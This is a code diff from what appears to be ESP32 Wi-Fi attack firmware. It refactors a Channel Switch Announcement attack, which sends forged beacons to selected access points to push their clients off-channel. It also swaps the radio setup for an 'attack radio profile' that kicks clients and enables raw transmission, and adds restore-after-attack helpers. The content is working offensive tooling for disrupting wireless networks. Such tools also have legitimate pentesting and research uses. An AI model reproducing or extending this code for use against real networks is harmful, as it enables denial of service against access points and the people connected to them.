@@ -120,7 +120,7 @@ static void csa_attack_task(void *param) {
                                 selected_aps[i].ssid, ssid_len,
                                 ap_channel, new_channel, seq_num++);
                 
-                esp_wifi_80211_tx(WIFI_IF_AP, beacon_buf, beacon_len, false);
+                esp_wifi_80211_tx(ap_manager_get_tx_iface(), beacon_buf, beacon_len, false);
                 csa_packets_sent++;
                 
                 vTaskDelay(pdMS_TO_TICKS(2));
@@ -163,19 +163,9 @@ void channel_switch_attack_start(void) {
     esp_wifi_stop();
     vTaskDelay(pdMS_TO_TICKS(50));
 
-#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
-    wifi_protocols_t p = {
-        .ghz_2g = WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR,
-        .ghz_5g = WIFI_PROTOCOL_11A | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AC | WIFI_PROTOCOL_11AX,
-    };
-    esp_wifi_set_protocols(WIFI_IF_AP, &p);
-    ESP_ERROR_CHECK(esp_wifi_start());
-#else
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
-    ESP_ERROR_CHECK(esp_wifi_start());
-    (void)esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
-#endif
+    // Attack radio profile: STA-only mode (GhostNet AP off, clients kicked)
+    // + wide/LR protocols for unrestricted channel hopping and raw TX
+    ESP_ERROR_CHECK(ap_manager_apply_attack_radio());
 
     glog("Starting Channel Switch Attack on %d AP(s)...\n", selected_ap_count);
     status_display_show_status("CSA Attack Start");
@@ -189,7 +179,7 @@ void channel_switch_attack_start(void) {
         status_display_show_status("CSA Start Fail");
         csa_task_handle = NULL;
         csa_stop_requested = false;
-        ap_manager_start_services();
+        (void)ap_manager_restore_after_attack("csa start");
         return;
     }
     rgb_manager_set_color(&rgb_manager, -1, 255, 0, 0, false);
@@ -216,7 +206,7 @@ void channel_switch_attack_stop(void) {
         csa_stop_requested = false;
         rgb_manager_set_color(&rgb_manager, -1, 0, 0, 0, false);
         esp_wifi_stop();
-        ap_manager_start_services();
+        (void)ap_manager_restore_after_attack("csa stop");
         status_display_show_status("CSA Stopped");
     } else {
         status_display_show_status("No CSA Active");
